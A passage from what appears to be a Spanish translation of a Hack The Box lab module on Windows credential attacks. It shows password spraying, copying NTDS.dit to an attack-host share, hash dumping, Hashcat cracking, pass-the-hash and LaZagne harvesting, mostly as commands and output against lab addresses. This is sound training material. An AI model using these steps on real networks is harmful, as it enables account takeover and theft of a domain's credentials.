SMB         10.129.201.57     445    DC01             [-] inlanefrieght.local\bwilliamson:winter2014 STATUS_LOGON_FAILURE 
SMB         10.129.201.57     445    DC01             [-] inlanefrieght.local\bwilliamson:winter2013 STATUS_LOGON_FAILURE 
SMB         10.129.201.57     445    DC01             [-] inlanefrieght.local\bwilliamson:P@55w0rd STATUS_LOGON_FAILURE 
SMB         10.129.201.57     445    DC01             [-] inlanefrieght.local\bwilliamson:P@ssw0rd! STATUS_LOGON_FAILURE 
SMB         10.129.201.57     445    DC01             [+] inlanefrieght.local\bwilliamson:P@55w0rd! 
```


En este ejemplo, NetExec utiliza SMB para intentar iniciar sesión como usuario (`-u`) `bwilliamson` usando una contraseña (`-p`) lista que contiene una lista de contraseñas de uso común (`/usr/share/wordlists/fasttrack.txt`). Si los administradores configuraron una política de bloqueo de cuenta, este ataque podría bloquear la cuenta a la que nos dirigimos.


#### Registros de eventos del ataque

![Visor de eventos de Windows que muestra registros de seguridad con ID de evento 4776 para validación de credenciales y detalles del evento.](https://academy.hackthebox.com/storage/modules/308/img/events_dc.png)

Puede resultar útil saber qué pudo haber dejado un ataque. Saber esto puede hacer que nuestras recomendaciones de remediación sean más impactantes y valiosas para el cliente con el que estamos trabajando. En cualquier sistema operativo Windows, un administrador puede navegar a `Event Viewer` y vea los eventos de seguridad para ver las acciones exactas que se registraron.


### Capturando NTDS.dit

`NT Directory Services` (`NTDS`) es el servicio de directorio utilizado con AD para encontrar y organizar recursos de red. Recordemos que `NTDS.dit` El archivo se almacena en `%systemroot%/ntds` en los controladores de dominio en a [bosque](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/using-the-organizational-domain-forest-model). El `.dit` significa [árbol de información del directorio](https://docs.oracle.com/cd/E19901-01/817-7607/dit.html). Este es el archivo de base de datos principal asociado con AD y almacena todos los nombres de usuario del dominio, hashes de contraseñas y otra información crítica del esquema. Si se puede capturar este archivo, podríamos comprometer potencialmente todas las cuentas del dominio de manera similar a la técnica que cubrimos en este módulo `Attacking SAM, SYSTEM, and SECURITY` sección. Mientras practicamos esta técnica, consideremos la importancia de proteger la EA y pensemos en algunas formas de evitar que ocurra este ataque.

#### Conexión a un DC con Evil-WinRM

Podemos conectarnos a un DC de destino usando las credenciales que capturamos.

```shell-session
vcrdcr@htb[/htb]$ evil-winrm -i 10.129.201.57  -u bwilliamson -p 'P@55w0rd!'
```

Evil-WinRM se conecta a un objetivo mediante el servicio de administración remota de Windows combinado con el protocolo remoto de PowerShell para establecer una sesión de PowerShell con el objetivo.


#### Comprobación de la pertenencia a un grupo local

Una vez conectados, podemos comprobar qué privilegios `bwilliamson` has. Podemos comenzar mirando la membresía del grupo local usando el comando:

```shell-session
*Evil-WinRM* PS C:\> net localgroup

Aliases for \\DC01

-------------------------------------------------------------------------------
*Access Control Assistance Operators
*Account Operators
*Administrators
*Allowed RODC Password Replication Group
*Backup Operators
*Cert Publishers
*Certificate Service DCOM Access
*Cryptographic Operators
*Denied RODC Password Replication Group
*Distributed COM Users
*DnsAdmins
*Event Log Readers
*Guests
*Hyper-V Administrators
*IIS_IUSRS
*Incoming Forest Trust Builders
*Network Configuration Operators
*Performance Log Users
*Performance Monitor Users
*Pre-Windows 2000 Compatible Access
*Print Operators
*RAS and IAS Servers
*RDS Endpoint Servers
*RDS Management Servers
*RDS Remote Access Servers
*Remote Desktop Users
*Remote Management Users
*Replicator
*Server Operators
*Storage Replica Administrators
*Terminal Server License Servers
*Users
*Windows Authorization Access Group
The command completed successfully.
```

Estamos buscando ver si la cuenta tiene derechos de administrador local. Para hacer una copia del archivo NTDS.dit, necesitamos un administrador local (`Administrators group`) o Administrador de dominio (`Domain Admins group`) (o derechos equivalentes). También querremos comprobar qué privilegios de dominio tenemos.


#### Comprobación de los privilegios de la cuenta de usuario, incluido el dominio

```shell-session
*Evil-WinRM* PS C:\> net user bwilliamson

User name                    bwilliamson
Full Name                    Ben Williamson
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/13/2022 12:48:58 PM
Password expires             Never
Password changeable          1/14/2022 12:48:58 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   1/14/2022 2:07:49 PM

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Users         *Domain Admins
The command completed successfully.
```

#### Creando una copia oculta de C:

Podemos usar `vssadmin` para crear un [Copia de sombra de volumen](https://docs.microsoft.com/en-us/windows-server/storage/file-server/volume-shadow-copy-service) (`VSS`) de la `C:` unidad o cualquier volumen que el administrador haya elegido al instalar AD inicialmente. Es muy probable que NTDS se almacene en `C:` ya que esa es la ubicación predeterminada seleccionada en la instalación, pero es posible cambiar la ubicación. Usamos VSS para esto porque está diseñado para hacer copias de volúmenes que se pueden leer y escribir activamente sin necesidad de desactivar una aplicación o sistema en particular. VSS es utilizado por muchos programas diferentes de respaldo y recuperación ante desastres para realizar operaciones.

```shell-session
*Evil-WinRM* PS C:\> vssadmin CREATE SHADOW /For=C:

vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
(C) Copyright 2001-2013 Microsoft Corp.

Successfully created shadow copy for 'C:\'
    Shadow Copy ID: {186d5979-2f2b-4afe-8101-9f1111e4cb1a}
    Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
```


#### Copiando NTDS.dit desde el VSS
Luego podemos copiar el `NTDS.dit` archivo de la copia oculta del volumen `C:` a otra ubicación en la unidad para prepararse para mover NTDS.dit a nuestro host de ataque.

```shell-session
*Evil-WinRM* PS C:\NTDS> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit

        1 file(s) copied.
```


#### Transferencia de NTDS.dit al host de ataque

Ahora `cmd.exe /c move` se puede utilizar para mover el archivo desde el DC de destino al recurso compartido en nuestro host de ataque.

```shell-session
*Evil-WinRM* PS C:\NTDS> cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData 

        1 file(s) moved.		
```


#### Extracción de hashes de NTDS.dit

Con una copia de `NTDS.dit` En nuestro host de ataque, podemos seguir adelante y volcar los hashes. Una forma de hacerlo es con Impacket `secretsdump`:

```shell-session
vcrdcr@htb[/htb]$ impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x62649a98dea282e3c3df04cc5fe4c130
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 086ab260718494c3a503c47d430a92a4
[*] Reading and decrypting hashes from NTDS.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:e6be3fd362edbaa873f50e384a02ee68:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:cbb8a44ba74b5778a06c2d08b4ced802:::
<SNIP>
```


### Un método más rápido: usar NetExec para capturar NTDS.dit

Alternativamente, podemos beneficiarnos del uso de NetExec para realizar los mismos pasos que se muestran arriba, todos con un solo comando. Este comando nos permite utilizar VSS para capturar y volcar rápidamente el contenido del archivo NTDS.dit de manera conveniente dentro de nuestra sesión de terminal.

```shell-session
vcrdcr@htb[/htb]$ netexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! -M ntdsutil

SMB         10.129.201.57   445     DC01         [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefrieght.local) (signing:True) (SMBv1:False)
SMB         10.129.201.57   445     DC01         [+] inlanefrieght.local\bwilliamson:P@55w0rd! (Pwn3d!)
NTDSUTIL    10.129.201.57   445     DC01         [*] Dumping ntds with ntdsutil.exe to C:\Windows\Temp\174556000
NTDSUTIL    10.129.201.57   445     DC01         Dumping the NTDS, this could take a while so go grab a redbull...
NTDSUTIL    10.129.201.57   445     DC01         [+] NTDS.dit dumped to C:\Windows\Temp\174556000
NTDSUTIL    10.129.201.57   445     DC01         [*] Copying NTDS dump to /tmp/tmpcw5zqy5r
NTDSUTIL    10.129.201.57   445     DC01         [*] NTDS dump copied to /tmp/tmpcw5zqy5r
NTDSUTIL    10.129.201.57   445     DC01         [+] Deleted C:\Windows\Temp\174556000 remote dump directory
NTDSUTIL    10.129.201.57   445     DC01         [+] Dumping the NTDS, this could take a while so go grab a redbull...
NTDSUTIL    10.129.201.57   445     DC01         Administrator:500:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
NTDSUTIL    10.129.201.57   445     DC01         Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
NTDSUTIL    10.129.201.57   445     DC01         DC01$:1000:aad3b435b51404eeaad3b435b51404ee:e6be3fd362edbaa873f50e384a02ee68:::
NTDSUTIL    10.129.201.57   445     DC01         krbtgt:502:aad3b435b51404eeaad3b435b51404ee:cbb8a44ba74b5778a06c2d08b4ced802:::
NTDSUTIL    10.129.201.57   445     DC01         inlanefrieght.local\jim:1104:aad3b435b51404eeaad3b435b51404ee:c39f2beb3d2ec06a62cb887fb391dee0:::
NTDSUTIL    10.129.201.57   445     DC01         WIN-IAUBULPG5MZ:1105:aad3b435b51404eeaad3b435b51404ee:4f3c625b54aa03e471691f124d5bf1cd:::
NTDSUTIL    10.129.201.57   445     DC01         WIN-NKHHJGP3SMT:1106:aad3b435b51404eeaad3b435b51404ee:a74cc84578c16a6f81ec90765d5eb95f:::
NTDSUTIL    10.129.201.57   445     DC01         WIN-K5E9CWYEG7Z:1107:aad3b435b51404eeaad3b435b51404ee:ec209bfad5c41f919994a45ed10e0f5c:::
NTDSUTIL    10.129.201.57   445     DC01         WIN-5MG4NRVHF2W:1108:aad3b435b51404eeaad3b435b51404ee:7ede00664356820f2fc9bf10f4d62400:::
NTDSUTIL    10.129.201.57   445     DC01         WIN-UISCTR0XLKW:1109:aad3b435b51404eeaad3b435b51404ee:cad1b8b25578ee07a7afaf5647e558ee:::
NTDSUTIL    10.129.201.57   445     DC01         WIN-ETN7BWMPGXD:1110:aad3b435b51404eeaad3b435b51404ee:edec0ceb606cf2e35ce4f56039e9d8e7:::
NTDSUTIL    10.129.201.57   445     DC01         inlanefrieght.local\bwilliamson:1125:aad3b435b51404eeaad3b435b51404ee:bc23a1506bd3c8d3a533680c516bab27:::
NTDSUTIL    10.129.201.57   445     DC01         inlanefrieght.local\bburgerstien:1126:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
NTDSUTIL    10.129.201.57   445     DC01         inlanefrieght.local\jstevenson:1131:aad3b435b51404eeaad3b435b51404ee:bc007082d32777855e253fd4defe70ee:::
NTDSUTIL    10.129.201.57   445     DC01         inlanefrieght.local\jjohnson:1133:aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24:::
NTDSUTIL    10.129.201.57   445     DC01         inlanefrieght.local\jdoe:1134:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
NTDSUTIL    10.129.201.57   445     DC01         Administrator:aes256-cts-hmac-sha1-96:cc01f5150bb4a7dda80f30fbe0ac00bed09a413243c05d6934bbddf1302bc552
NTDSUTIL    10.129.201.57   445     DC01         Administrator:aes128-cts-hmac-sha1-96:bd99b6a46a85118cf2a0df1c4f5106fb
NTDSUTIL    10.129.201.57   445     DC01         Administrator:des-cbc-md5:618c1c5ef780cde3
NTDSUTIL    10.129.201.57   445     DC01         DC01$:aes256-cts-hmac-sha1-96:113ffdc64531d054a37df36a07ad7c533723247c4dbe84322341adbd71fe93a9
NTDSUTIL    10.129.201.57   445     DC01         DC01$:aes128-cts-hmac-sha1-96:ea10ef59d9ec03a4162605d7306cc78d
NTDSUTIL    10.129.201.57   445     DC01         DC01$:des-cbc-md5:a2852362e50eae92
NTDSUTIL    10.129.201.57   445     DC01         krbtgt:aes256-cts-hmac-sha1-96:1eb8d5a94ae5ce2f2d179b9bfe6a78a321d4d0c6ecca8efcac4f4e8932cc78e9
NTDSUTIL    10.129.201.57   445     DC01         krbtgt:aes128-cts-hmac-sha1-96:1fe3f211d383564574609eda482b1fa9
NTDSUTIL    10.129.201.57   445     DC01         krbtgt:des-cbc-md5:9bd5017fdcea8fae
NTDSUTIL    10.129.201.57   445     DC01         inlanefrieght.local\jim:aes256-cts-hmac-sha1-96:4b0618f08b2ff49f07487cf9899f2f7519db9676353052a61c2e8b1dfde6b213
NTDSUTIL    10.129.201.57   445     DC01         inlanefrieght.local\jim:aes128-cts-hmac-sha1-96:d2377357d473a5309505bfa994158263
NTDSUTIL    10.129.201.57   445     DC01         inlanefrieght.local\jim:des-cbc-md5:79ab08755b32dfb6
NTDSUTIL    10.129.201.57   445     DC01         WIN-IAUBULPG5MZ:aes256-cts-hmac-sha1-96:881e693019c35017930f7727cad19c00dd5e0cfbc33fd6ae73f45c117caca46d
NTDSUTIL    10.129.201.57   445     DC01         WIN-IAUBULPG5MZ:aes128-cts-hmac-sha1-
NTDSUTIL    10.129.201.57   445     DC01         [+] Dumped 61 NTDS hashes to /home/bob/.nxc/logs/DC01_10.129.201.57_2025-04-25_084640.ntds of which 15 were added to the database
NTDSUTIL    10.129.201.57   445    DC01          [*] To extract only enabled accounts from the output file, run the following command: 
NTDSUTIL    10.129.201.57   445    DC01          [*] grep -iv disabled /home/bob/.nxc/logs/DC01_10.129.201.57_2025-0
```



### Descifrando hashes y obteniendo credenciales
#### Descifrando un solo hash con Hashcat

```shell-session
vcrdcr@htb[/htb]$ sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt

64f12cddaa88057e06a81b54e73b949b:Password1
```


### Pasar las consideraciones de Hash (PtH)

Todavía podemos usar hashes para intentar autenticarnos con un sistema usando un tipo de ataque llamado `Pass-the-Hash` (`PtH`). Un ataque PtH aprovecha el [Protocolo de autenticación NTLM](https://docs.microsoft.com/en-us/windows/win32/secauthn/microsoft-ntlm#:~:text=NTLM%20uses%20an%20encrypted%20challenge,to%20the%20secured%20NTLM%20credentials) para autenticar a un usuario utilizando un hash de contraseña. En lugar de `username`:`clear-text password` Como formato para iniciar sesión, podemos utilizar `username`:`password hash`. He aquí un ejemplo de cómo funcionaría esto:

#### Pase el hash (PtH) con el ejemplo Evil-WinRM

```shell-session
vcrdcr@htb[/htb]$ evil-winrm -i 10.129.201.57 -u Administrator -H 64f12cddaa88057e06a81b54e73b949b
```


# Búsqueda de credenciales en Windows
Con acceso a la GUI, vale la pena intentar usarlo `Windows Search` para encontrar archivos en el destino utilizando algunas de las palabras clave mencionadas anteriormente.

![Búsqueda en Windows de 'contraseña' que muestra 'Cambie su contraseña' en la configuración del sistema y opciones relacionadas.](https://academy.hackthebox.com/storage/modules/308/img/WindowsSearch.png)

De forma predeterminada, buscará en varias configuraciones del sistema operativo y en el sistema de archivos archivos y aplicaciones que contengan el término clave ingresado en la barra de búsqueda.

#### La Zagne

También podemos aprovechar herramientas de terceros como [La Zagne](https://github.com/AlessandroZ/LaZagne) para descubrir rápidamente credenciales que los navegadores web u otras aplicaciones instaladas pueden almacenar de forma insegura. LaZagne se compone de `modules` cada uno de los cuales apunta a un software diferente cuando busca contraseñas. Algunos de los módulos comunes se describen en la siguiente tabla:

|Módulo|Descripción|
|---|---|
|navegadores|Extrae contraseñas de varios navegadores, incluidos Chromium, Firefox, Microsoft Edge y Opera|
|chats|Extrae contraseñas de varias aplicaciones de chat, incluida Skype|
|correos|Busca contraseñas en buzones de correo, incluidos Outlook y Thunderbird|
|memoria|Volca contraseñas de la memoria, apuntando a KeePass y LSASS|
|administrador de sistemas|Extrae contraseñas de los archivos de configuración de varias herramientas de administración de sistemas como OpenVPN y WinSCP|
|ventanas|Extrae credenciales específicas de Windows dirigidas a secretos LSA, administrador de credenciales y más|
|wifi|Volca credenciales de WiFi|

**Nota:** Los navegadores web son algunos de los lugares más interesantes para buscar credenciales, debido a que muchos de ellos ofrecen almacenamiento de credenciales integrado. En los navegadores más populares, como `Google Chrome`, `Microsoft Edge`, y `Firefox`, las credenciales almacenadas están cifradas. Sin embargo, se pueden encontrar en línea muchas herramientas para descifrar las distintas bases de datos de credenciales utilizadas, como por ejemplo [firefox_decrypt](https://github.com/unode/firefox_decrypt) y [descifrar contraseñas de cromo](https://github.com/ohyicong/decrypt-chrome-passwords). LaZagne apoya `35` diferentes navegadores en Windows.

Sería beneficioso mantener un [copia independiente](https://github.com/AlessandroZ/LaZagne/releases/) de LaZagne en nuestro anfitrión de ataque para que podamos transferirlo rápidamente al objetivo. `LaZagne.exe` Nos irá muy bien en este escenario. Podemos usar nuestro cliente RDP para copiar el archivo al objetivo desde nuestro host de ataque. Si estamos usando `xfreerdp` Todo lo que debemos hacer es copiar y pegar en la sesión RDP que hemos establecido.

Una vez `LaZagne.exe` está en el destino, podemos abrir el símbolo del sistema o PowerShell, navegar al directorio en el que se cargó el archivo y ejecutar el siguiente comando:

```cmd-session
C:\Users\bob\Desktop> start LaZagne.exe all
```

Esto ejecutará LaZagne y se ejecutará `all` módulos incluidos. Podemos incluir la opción `-vv` para estudiar lo que está haciendo en segundo plano. Una vez que presionamos Enter, se abrirá otro mensaje y se mostrarán los resultados.

```cmd-session
|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|


########## User: bob ##########

------------------- Winscp passwords -----------------

[+] Password found !!!
URL: 10.129.202.51
Login: admin
Password: SteveisReallyCool123
Port: 22
```

Si usáramos el `-vv` Opción, veríamos intentos de recopilar contraseñas de todo el software compatible con LaZagne. También podemos consultar la página de GitHub en la sección de software compatible para ver todo el software del que LaZagne intentará recopilar credenciales. Puede resultar un poco impactante ver lo fácil que puede ser obtener credenciales en texto claro. Gran parte de esto puede atribuirse a la forma insegura en que muchas aplicaciones almacenan credenciales.

#### findstr

También podemos utilizar [findstr](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/findstr) para buscar patrones en muchos tipos de archivos. Teniendo en cuenta los términos clave comunes, podemos utilizar variaciones de este comando para descubrir credenciales en un destino de Windows:

```cmd-session
C:\> findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
```

## Consideraciones adicionales

Hay miles de herramientas y términos clave que podríamos usar para buscar credenciales en los sistemas operativos Windows. Sepa cuáles elegimos utilizar se basarán principalmente en la función de la computadora. Si aterrizamos en un servidor Windows, podemos utilizar un enfoque diferente que si aterrizamos en un escritorio Windows. Tenga siempre presente cómo se utiliza el sistema y esto nos ayudará a saber dónde buscar. A veces, incluso podemos encontrar credenciales navegando y enumerando directorios en el sistema de archivos mientras se ejecutan nuestras herramientas.

A continuación se muestran algunos otros lugares que debemos tener en cuenta al buscar credenciales:

- Contraseñas en la política de grupo en el recurso compartido SYSVOL
- Contraseñas en scripts en el recurso compartido SYSVOL
- Contraseña en scripts en recursos compartidos de TI
- Contraseñas en `web.config` Archivos en máquinas de desarrollo y recursos compartidos de TI
- Contraseña en `unattend.xml`
- Contraseñas en los campos de descripción del usuario de AD o de la computadora
- Bases de datos de KeePass (si podemos adivinar o descifrar la contraseña maestra)
- Se encuentra en sistemas de usuario y recursos compartidos
- Archivos con nombres como `pass.txt`, `passwords.docx`, `passwords.xlsx` se encuentra en sistemas de usuario, recursos compartidos y [Sharepoint](https://www.microsoft.com/en-us/microsoft-365/sharepoint/collaboration)

Ha obtenido acceso a la estación de trabajo Windows 10 de un administrador de TI y comienza su proceso de búsqueda de credenciales buscando credenciales en ubicaciones de almacenamiento comunes.

`Connect to the target and use what you've learned to discover the answers to the challenge questions`.
